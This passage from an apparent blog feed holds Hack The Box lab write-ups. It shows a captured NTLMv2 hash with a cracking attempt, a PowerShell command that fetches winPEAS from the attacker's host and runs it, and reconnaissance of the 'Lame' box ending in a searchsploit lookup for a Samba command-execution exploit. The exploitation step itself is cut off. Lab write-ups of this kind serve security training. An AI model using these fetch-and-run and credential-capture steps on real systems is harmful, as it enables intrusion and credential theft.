<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Hash     : luke::RE:4dcf97c80d5c1773:29507DD2F56A177A6E6CF61F756B69D3:0101000000000000C0653150DE09D20104BFD27A2A433B64000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000A937185F9D8BE12DC1461140265EB6CA543BFBFE1765CEFB7733FCC5D6BF30D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003300000000000000000000000000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Skipping previously captured <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">for</span> RE<span style="color:#f1fa8c">\l</span>uke
</code></pre></td></tr></table>
</div>
</div><p>We copy the hash into a file re.htmlv2, and process it with hashcat, but we are not successful to crack the password</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat re.ntmlv2
luke::RE:4dcf97c80d5c1773:29507DD2F56A177A6E6CF61F756B69D3:0101000000000000C0653150DE09D20104BFD27A2A433B64000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000A937185F9D8BE12DC1461140265EB6CA543BFBFE1765CEFB7733FCC5D6BF30D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003300000000000000000000000000
apt install hashcat
hashcat --help C| grep exampl
hashcat --example-hashes &gt; /tmp/hashes.txt
 MODE: <span style="color:#bd93f9">5600</span>
 NetNTLMv2
 HASH: 0UL5G37JOI0SX::6VB1IS0KA74:ebe1afa18b7fbfa6:aab8bf8675658dd2a939458a1077ba08:010100000000000031c8aa092510945398b9f7b7dde1a9fb00000000f7876f2b04b700
 PASS: hashcat
</code></pre></td></tr></table>
</div>
</div><p>Upload Winpeas</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\Luke\Desktop&gt; <span style="color:#8be9fd;font-style:italic">Invoke-RestMethod</span> -Uri http://10.10.14.73:8080/winPEAS.bat -Method Get &gt; winPEAS.bat
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\Luke\Desktop&gt; <span style="color:#8be9fd;font-style:italic">type </span>winPEAS.bat
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\Luke\Desktop&gt; winPEAS.bat
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Lame</title><link>https://0xade1.github.io/posts/2020/04/htb-lame/</link><pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/04/htb-lame/</guid><description>Reckon interesting ports are FTP, SSH, SMB
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # Nmap 7.60 scan initiated Fri Feb 21 07:12:06 2020 as: nmap -sV -sC -oA nmap/lame -Pn 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.</description><content type="html"><![CDATA[<h1 id="reckon">Reckon</h1>
<p>interesting ports are FTP, SSH, SMB</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 21 07:12:06 2020 as: nmap -sV -sC -oA nmap/lame -Pn 10.10.10.3</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.3
Host is up <span style="color:#ff79c6">(</span>0.27s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">996</span> filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed <span style="color:#ff79c6">(</span>FTP code 230<span style="color:#ff79c6">)</span>
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#bd93f9">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#ff79c6">(</span>DSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#ff79c6">(</span>workgroup: WORKGROUP<span style="color:#ff79c6">)</span>
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#ff79c6">(</span>workgroup: WORKGROUP<span style="color:#ff79c6">)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix <span style="color:#ff79c6">(</span>Samba 3.0.20-Debian<span style="color:#ff79c6">)</span>
|   NetBIOS computer name:
|   Workgroup: WORKGROUP<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">00</span>
|_  System time: 2020-02-17T23:17:49-05:00
|_smb2-time: Protocol negotiation failed <span style="color:#ff79c6">(</span>SMB2<span style="color:#ff79c6">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Fri Feb 21 07:13:17 2020 -- 1 IP address (1 host up) scanned in 70.22 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>scanning for vulnerabilities is not showing anything interesting</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 21 07:32:13 2020 as: nmap -p21,22,445 -sV --script=vuln -oA nmap/vuln -Pn 10.10.10.3</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.3
Host is up <span style="color:#ff79c6">(</span>0.29s latency<span style="color:#ff79c6">)</span>.

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_sslv2-drown:
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#ff79c6">(</span>workgroup: WORKGROUP<span style="color:#ff79c6">)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: <span style="color:#8be9fd;font-style:italic">false</span>
|_smb-vuln-ms10-061: <span style="color:#8be9fd;font-style:italic">false</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Fri Feb 21 07:32:52 2020 -- 1 IP address (1 host up) scanned in 39.20 seconds</span>

</code></pre></td></tr></table>
</div>
</div><h2 id="exploring-smb">Exploring SMB</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L <span style="color:#f1fa8c">\\</span>10.10.10.3
WARNING: The <span style="color:#f1fa8c">&#34;syslog&#34;</span> option is deprecated
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service <span style="color:#ff79c6">(</span>lame server <span style="color:#ff79c6">(</span>Samba 3.0.20-Debian<span style="color:#ff79c6">))</span>
        ADMIN$          IPC       IPC Service <span style="color:#ff79c6">(</span>lame server <span style="color:#ff79c6">(</span>Samba 3.0.20-Debian<span style="color:#ff79c6">))</span>
</code></pre></td></tr></table>
</div>
</div><p>We have samba version 3.0.20-Debian</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit samba 3.0.20
searchsploit
--------------------------------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                                             |  Path
                                                                                                                           | <span style="color:#ff79c6">(</span>/opt/exploitdb/<span style="color:#ff79c6">)</span>
--------------------------------------------------------------------------------------------------------------------------- ----------------------------------
Samba 3.0.20 &lt; 3.0.25rc3 - <span style="color:#f1fa8c">&#39;Username&#39;</span> map script<span style="color:#f1fa8c">&#39; Command Execution (Metasploit)                                           | exploits/unix/remote/16320.rb
</span><span style="color:#f1fa8c">Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                      | exploits/linux/remote/7701.txt
</span><span style="color:#f1fa8c">--------------------------------------------------------------------------------------------------------------------------- ----------------------------------
</span><span style="color:#f1fa8c">Shellcodes: No Result
</span><span style="color:#f1fa8c">%
</span><span style="color:#f1fa8c">searchsploit -p 16320
</span><span style="color:#f1fa8c">searchsploit
</span><span style="color:#f1fa8c">  Exploit: Samba 3.0.20 &lt; 3.0.25rc3 - &#39;</span>Username<span style="color:#f1fa8c">&#39; map script&#39;</span> Command Execution <span style="color:#ff79c6">(</span>Metasploit<span style="color:#ff79c6">)</span>
      URL: https://www.exploit-db.com/exploits/16320
     Path: /opt/exploitdb/exploits/unix/remote/16320.rb
File Type: Ruby script, ASCII text, with CRLF line terminators
</code></pre></td></tr></table>
</div>
</div><h1 id="exploitation">Exploitation</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
